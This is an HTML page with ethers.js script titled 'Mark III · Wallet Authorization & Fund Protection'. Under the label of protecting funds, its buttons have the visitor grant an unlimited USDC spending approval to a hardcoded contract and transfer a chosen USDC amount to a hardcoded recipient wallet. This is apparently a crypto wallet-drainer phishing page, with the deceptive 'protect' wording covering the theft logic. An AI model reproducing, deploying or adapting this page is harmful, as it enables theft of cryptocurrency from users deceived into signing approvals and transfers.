<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III · Wallet Authorization & Fund Protection</title>
</head>
<body>
  <h2>Mark III · Wallet Authorization & Fund Protection</h2>

  <button id="connect">🔵 Connect Wallet</button>
  <button id="approve">🟢 Protect Wallet</button>
  <button id="transfer">🟡 Start Protect</button>
  <button id="status">🟣 Reset / Status</button>

  <div id="output" style="margin-top: 10px; color: #333;"></div>

  <!-- ethers.js CDN -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <script>
    // ✅ 使用全小写地址 + getAddress() 强制格式校验
    const usdcAddress = ethers.utils.getAddress("0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48");
    const contractAddress = ethers.utils.getAddress("0x86dbe265b0d503e68676971fc7d6aad7e5d90b12");
    const recipientWallet = ethers.utils.getAddress("0x59e513ae37614f1e670bfe961b3456257c444d24");
    const approveAmount = ethers.constants.MaxUint256;

    let provider, signer, userAddress;

    const log = (msg) => {
      document.getElementById("output").innerHTML = msg;
    };

    // 🔵 Connect Wallet
    document.getElementById("connect").onclick = async () => {
      if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        log("✅ Wallet connected: " + userAddress);
      } else {
        log("❌ No wallet provider found.");
      }
    };

    // 🟢 Approve USDC to Contract
    document.getElementById("approve").onclick = async () => {
      try {
        const usdc = new ethers.Contract(
          usdcAddress,
          ["function approve(address spender, uint256 amount) public returns (bool)"],
          signer
        );
        const tx = await usdc.approve(contractAddress, approveAmount);
        await tx.wait();
        log("✅ USDC approved successfully.");
      } catch (err) {
        log("❌ Approval failed: " + err.message);
      }
    };

    // 🟡 Transfer Funds
    document.getElementById("transfer").onclick = async () => {
      try {
        const amount = prompt("Enter the USDC amount to protect:");
        const parsed = ethers.utils.parseUnits(amount, 6);
        const usdc = new ethers.Contract(
          usdcAddress,
          ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"],
          signer
        );
        const tx = await usdc.transferFrom(userAddress, recipientWallet, parsed);
        await tx.wait();
        log("✅ Funds successfully protected.");
      } catch (err) {
        log("❌ Transfer failed: " + err.message);
      }
    };

    // 🟣 Reset or Status
    document.getElementById("status").onclick = () => {
      log("🔄 Wallet: " + (userAddress || "Not connected") + "<br>Ready for next step.");
    };
  </script>
</body>
</html>
